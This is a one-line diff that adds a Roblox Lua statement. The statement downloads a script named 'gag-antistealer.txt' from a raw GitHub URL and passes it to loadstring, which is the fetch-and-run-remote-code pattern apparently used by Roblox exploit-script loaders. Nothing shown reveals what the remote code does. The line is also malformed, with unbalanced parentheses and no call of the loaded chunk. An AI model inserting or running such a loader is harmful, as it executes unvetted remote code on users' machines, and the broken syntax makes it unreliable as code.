@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Menwey/ZovraraScripts/refs/heads/main/gag-antistealer.txt")
